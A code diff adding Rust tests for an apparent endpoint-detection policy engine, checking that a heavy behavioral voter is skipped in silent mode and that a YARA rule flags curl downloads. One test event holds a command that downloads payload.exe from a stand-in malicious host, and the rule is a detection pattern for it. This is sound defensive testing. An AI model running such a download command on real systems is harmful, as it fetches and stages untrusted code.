@@ -948,5 +948,148 @@ mod tests {
         let verdict_normal = policy.scan_event(&ev_silent).await;
         assert!(verdict_normal.is_none());
     }
+
+    #[tokio::test]
+    async fn test_behavioral_classifier_voter_heavy_and_silent_mode() {
+        use osoosi_types::{HostEventSource, TelemetryControllerInterface, TelemetryMode};
+        use serde_json::json;
+
+        let memory = Arc::new(osoosi_memory::MemoryStore::new(":memory:").expect("memory store"));
+        let adaptive = Arc::new(crate::adaptive::TelemetryController::new());
+        let classifier = Arc::new(osoosi_behavioral::BehavioralClassifier::new().await);
+        let voter = BehavioralClassifierVoter {
+            classifier: classifier.clone(),
+            adaptive: adaptive.clone(),
+        };
+
+        // Assert contract
+        assert!(voter.is_heavy(), "BehavioralClassifierVoter must be marked heavy");
+        assert_eq!(voter.name(), "BehavioralAI-Cortex");
+
+        // Consensus integration test: PolicyEngine skips BehavioralClassifierVoter in SILENT mode
+        let mut policy = osoosi_policy::PolicyEngine::new(memory.clone(), osoosi_types::PolicyConfig::default());
+        policy.telemetry_controller = Some(adaptive.clone());
+        policy.add_voter(Box::new(voter)).await;
+
+        *adaptive.current_mode.write().unwrap() = TelemetryMode::Silent;
+        assert!(adaptive.is_silent_mode());
+
+        let ev_cmd = HostSecurityEvent {
+            source: HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "TEST-HOST".to_string(),
+            data: json!({
+                "ProcessId": 1234,
+                "Image": r"C:\Windows\System32\cmd.exe",
+                "CommandLine": r"cmd.exe /c whoami"
+            }),
+            causal_parent: None,
+        };
+
+        // Heavy voter is skipped in silent mode
+        let verdict_silent = policy.scan_event(&ev_cmd).await;
+        assert!(verdict_silent.is_none());
+
+        // In normal mode, voter is executed
+        *adaptive.current_mode.write().unwrap() = TelemetryMode::Normal;
+        assert!(!adaptive.is_silent_mode());
+        let _verdict_normal = policy.scan_event(&ev_cmd).await;
+    }
+
+    #[tokio::test]
+    async fn test_behavioral_yara_voter_decoupled_execution_and_burst() {
+        use osoosi_types::HostEventSource;
+        use serde_json::json;
+
+        let mut compiler = yara_x::Compiler::new();
+        compiler
+            .add_source(
+                r#"
+            rule Suspicious_Curl_Download {
+                strings:
+                    $curl = "curl.exe"
+                    $http = "http"
+                condition:
+                    all of them
+            }
+        "#,
+            )
+            .expect("compile behavioral yara rule");
+
+        let rules = Arc::new(compiler.build());
+        let adaptive = Arc::new(crate::adaptive::TelemetryController::new());
+        let total_detections = Arc::new(std::sync::atomic::AtomicU64::new(0));
+
+        let yara_voter = BehavioralYaraVoter {
+            rules: rules.clone(),
+            adaptive: adaptive.clone(),
+            total_detections: total_detections.clone(),
+        };
+
+        // Assert contract
+        assert!(!yara_voter.is_heavy(), "BehavioralYaraVoter must NOT be heavy");
+        assert_eq!(yara_voter.name(), "BehavioralYara");
+
+        // 1. Positive match
+        let ev_malicious = HostSecurityEvent {
+            source: HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "TEST-HOST".to_string(),
+            data: json!({
+                "ProcessId": 4567,
+                "Image": r"C:\Windows\System32\curl.exe",
+                "CommandLine": "curl.exe http://malicious.example.com/payload.exe -o payload.exe"
+            }),
+            causal_parent: None,
+        };
+
+        let vote = yara_voter.vote(&ev_malicious).await;
+        assert!(vote.is_some(), "Expected BehavioralYara detection");
+        let v = vote.unwrap();
+        assert_eq!(v.confidence, 0.9);
+        assert_eq!(v.weight, 0.8);
+        assert!(v.reason.contains("BehavioralYara: DETECTED - Suspicious_Curl_Download"));
+        assert_eq!(total_detections.load(std::sync::atomic::Ordering::Relaxed), 1);
+
+        // 2. Benign event (no match)
+        let ev_benign = HostSecurityEvent {
+            source: HostEventSource::WindowsEventLog,
+            event_id: 1,
+            timestamp: chrono::Utc::now(),
+            computer: "TEST-HOST".to_string(),
+            data: json!({
+                "ProcessId": 4568,
+                "Image": r"C:\Windows\System32\notepad.exe",
+                "CommandLine": "notepad.exe file.txt"
+            }),
+            causal_parent: None,
+        };
+
+        let vote_benign = yara_voter.vote(&ev_benign).await;
+        assert!(vote_benign.is_none());
+        assert_eq!(total_detections.load(std::sync::atomic::Ordering::Relaxed), 1);
+
+        // 3. High-volume concurrent burst test (50 tasks executing concurrently via spawn_blocking)
+        let voter_arc = Arc::new(yara_voter);
+        let mut handles = Vec::new();
+        for _ in 0..50 {
+            let voter_clone = voter_arc.clone();
+            let ev_clone = ev_malicious.clone();
+            handles.push(tokio::spawn(async move {
+                voter_clone.vote(&ev_clone).await
+            }));
+        }
+
+        for h in handles {
+            let res = h.await.expect("task join");
+            assert!(res.is_some());
+        }
+
+        // 1 initial + 50 burst detections = 51
+        assert_eq!(total_detections.load(std::sync::atomic::Ordering::Relaxed), 51);
+    }
 }
+
 
